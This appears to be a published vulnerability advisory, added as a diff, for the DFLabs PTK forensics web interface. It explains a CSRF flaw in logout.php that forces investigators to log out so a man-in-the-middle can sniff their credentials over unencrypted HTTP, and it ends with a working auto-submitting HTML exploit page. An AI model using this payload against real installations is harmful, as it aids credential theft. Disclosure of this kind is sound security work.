@@ -1,0 +1,54 @@
++---------------------------------------------------------------------------------------------------------------------------------------------------+
+# Exploit Title : DFLabs PTK <= 1.0.5 Multiple Vulnerabilities (Steal Authentication Credentials)
+# Date          : 22-02-2012
+# Author        : Ivano Binetti (http://ivanobinetti.com)
+# Software link : http://sourceforge.net/projects/ptk-forensics/files/latest/download
+# Vendor site   : http://www.dflabs.com
+# Version       : 1.0.5 (and lower)
+# Tested on     : Ubuntu 10.04
++---------------------------------------------------------------------------------------------------------------------------------------------------+
++-------------------------[Steal Authentication Credentials by Ivano Binetti]-----------------------------------------------------------------------+
+Summary
+
+1)Introduction
+2)Vulnerability Description
+3)Exploit
+
++---------------------------------------------------------------------------------------------------------------------------------------------------+
+
+1)Introduction
+DFLabs PTK is "an alternative advanced interface for the suite TSK (The Sleuth Kit)". 
+
+2)Vulnerability Description
+PTK 1.0.5 (and lower) suffer from a CSRF vulnerability which allows an attacker to force administrator/investigator logout at web management 
+interface. Furthermore PTK's default installation (following the procedure indicated into PTK's "INSTALL" file) doesn't perform "http to https" 
+redirection in order to secure http connection by transport layer encryption. To default there isn't https redirection in the authentication
+phase as well as there isn't https redirection during other PTK's activities. If an internal attacker (the nature of this tool makes difficult
+that PTK may have public ip address) makes an Man in the Middle attack (I successfully made it using Dsniff and Ettercap) the CSRF vulnerability
+found, forcing the administrator/investigator to logout, will aid the attacker to sniff authentication credentials. This condition can occur when
+PTK is used in production environment and the investigator is conducting an analysis about internal people. Of course this logic can be extended
+to any person which has access to internal LAN as an attacker which with a client-based exploit can control a internal client which can reach 
+PTK's server.
+
+This vulnerability is correlated to poor session  check into /<ptk_main_directory>/lib/logout.php script. In fact, differently from other php
+script, where there is the php code like the following to session's check:
+
+if (!isset($_SESSION['case_token']) or strcmp($_SESSION['user'],"admin")!=0 or strcmp($_SESSION['case_token'],$_GET['tk'])!=0 or $token_age > 300){
+ 	new AuditLog('Unauthorized access to delete_case '.sanitize(RemoveXSS($_GET['id']),PARANOID));
+        header("location: goto_home.php");
+
+into /<ptk_main_directory>/lib/logout.php there isn't tha above check. This security flaw allows an attacker to force administrator/investigator
+logout using a CSRF vulnerability.
+When an administrator/investigator browses a web pages which contains the following html/javascript code he is forced to logout at the PTK web
+management interface.
+
+3)Exploit
+<html>
+<body onload="javascript:document.forms[0].submit()">
+<H2>CSRF Exploit to force ADMIN/INVESTIGATOR logout</H2>
+<form method="GET" name="form0" action="http://<ptk_ip_address>:80/lib/logout.php">
+</form>
+</body>
+</html>
+
++--------------------------------------------------------------------------------------------------------------------------------------------------+
